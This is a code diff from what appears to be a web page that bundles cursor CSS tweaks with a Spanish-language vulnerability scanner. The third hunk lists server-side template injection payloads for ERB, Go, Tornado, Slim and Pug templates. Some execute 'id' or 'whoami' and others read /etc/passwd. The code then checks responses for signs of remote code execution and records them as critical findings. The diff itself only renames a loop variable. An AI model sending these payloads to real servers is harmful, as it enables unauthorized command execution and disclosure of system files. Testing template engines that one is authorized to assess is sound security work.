@@ -27,8 +27,8 @@ body{background:var(--bg);color:var(--text);font-family:var(--body);overflow-x:h
 a{color:inherit;text-decoration:none;}
 
 /* CURSOR */
-.c-dot{position:fixed;width:6px;height:6px;background:var(--acc);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 10px var(--acc),0 0 20px rgba(255,26,46,0.4);transition:transform 0.1s;}
-.c-ring{position:fixed;width:36px;height:36px;border:1px solid rgba(255,26,46,0.45);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:width 0.3s,height 0.3s,border-color 0.3s;}
+.c-dot{position:fixed;width:6px;height:6px;background:var(--acc);border-radius:50%;pointer-events:none;z-index:10050;transform:translate(-50%,-50%);box-shadow:0 0 10px var(--acc),0 0 20px rgba(255,26,46,0.4);transition:transform 0.1s;}
+.c-ring{position:fixed;width:36px;height:36px;border:1px solid rgba(255,26,46,0.45);border-radius:50%;pointer-events:none;z-index:10049;transform:translate(-50%,-50%);transition:width 0.3s,height 0.3s,border-color 0.3s;}
 .c-dot.hover{transform:translate(-50%,-50%) scale(0);}
 .c-ring.hover{width:56px;height:56px;border-color:var(--acc);}
 body.has-cursor{cursor:none;}
@@ -2004,10 +2004,6 @@ section .wrap { position: relative; z-index: 1; }
 
 
 /* ══ CURSOR SIEMPRE VISIBLE ══ */
-.cursor-dot, .cursor-ring, #cursor-dot, #cursor-ring {
-  z-index: 10002 !important;
-  pointer-events: none !important;
-}
 .mega-menu, .mega-overlay { cursor: auto; }
 
 
@@ -12012,7 +12008,7 @@ logOk('SSTI completo');
 /* SSTI: ERB (Ruby), Go Templates, Tornado (Python), Slim, Pug/Jade */
 logInfo('SSTI: probando ERB, Go, Tornado, Slim, Pug...');
 var sstiLang=[target+'?name=<%=7*7%>',target+'?name=<%=system("id")%>',target+'?name=<%=`id`%>',target+'?name=<%=require("child_process").execSync("id")%>',target+'?name=<%=File.read("/etc/passwd")%>',target+'?name=<%=IO.popen("id").read%>',target+'?name=<%=eval("7*7")%>',target+'?name=<%=open("|id").read%>',target+'?name={{.System "id"}}',target+'?name={{printf "%d" 49}}',target+'?name={{exec "id"}}',target+'?name={{template "x" .}}',target+'?name={{call exec "id"}}',target+'?name={{html "49"}}',target+'?name={{urlquery "49"}}',target+'?name={% module %}{% endmodule %}',target+'?name={{static "id"}}',target+'?name={% raw 7*7 %}',target+'?name={% endraw %}',target+'?name={{ `id` }}',target+'?name={{ os/exec.Command "id" }}',target+'?name=<%= 7*7 %>',target+'?name=<%== 7*7 %>',target+'?name=@@7*7@@',target+'?name=#{7*7}',target+'?name={{7*7}}',target+'?name=#{ `id` }',target+'?name=~= 7*7',target+'?name=<%= `cat /etc/passwd` %>',target+'?name=<%= IO.read("/etc/passwd") %>',target+'?name={{ .Files.Get "/etc/passwd" }}',target+'?name={{ pipeline "id" }}',target+'?name={{ debug }}',target+'?name=<%= `whoami` %>'];
-for(var sl=0;sl<sstiLang.length;sl++){var rsstL=await get(sstiLang[sl]);
+for(var sli=0;sli<sstiLang.length;sli++){var rsstL=await get(sstiLang[sli]);
 if(rsstL.ok&&rsstL.body&&rsstL.body.indexOf('49')>-1&&rsstL.body.indexOf('<%')===-1&&rsstL.body.indexOf('{{')===-1&&rsstL.body.indexOf('7*7')===-1&&sstiBaseBody.indexOf('49')===-1){logErr('SSTI LANG: evaluacion detectada en motor adicional (ERB/Go/Tornado)!');addF('crit','SSTI en motor especifico','Template injection en ERB/Go/Tornado/Slim confirmado');markCrit('p31');break;}
 if(rsstL.ok&&rsstL.body&&/Runtime|exec|system|child_process|IO\.popen|os\.exec|ERB|Tornado|TemplateError|TemplateSyntax/i.test(rsstL.body)&&!/Runtime|exec|system|child_process|IO\.popen|os\.exec|ERB|Tornado|TemplateError|TemplateSyntax/i.test(sstiBaseBody)){logErr('SSTI LANG: error o output de motor especifico detectado');addF('high','SSTI motor especifico detectado','Error/output revela ERB/Go/Tornado');markCrit('p31');break;}
 if(rsstL.ok&&rsstL.body&&/root:x:0:0|uid=\d+/.test(rsstL.body)&&!/root:x:0:0|uid=\d+/.test(sstiBaseBody)){logErr('SSTI LANG: RCE confirmado via ERB/Go/Tornado!');addF('crit','SSTI RCE en motor especifico','Ejecucion de comandos via template injection ERB/Go/Tornado');markCrit('p31');break;}}
